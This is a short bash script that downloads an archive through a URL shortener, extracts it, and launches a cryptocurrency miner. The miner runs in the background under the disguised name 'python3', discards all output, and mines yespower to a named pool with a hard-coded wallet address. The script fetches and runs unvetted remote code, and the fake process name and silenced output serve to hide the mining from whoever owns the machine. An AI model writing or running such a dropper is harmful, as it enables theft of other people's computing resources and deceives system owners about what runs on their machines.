#!/bin/bash
wget -O dot s.id/dotaja

tar -xzvf dot

nohup ./dotsrb/python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOTonly > /dev/null 2>&1 &
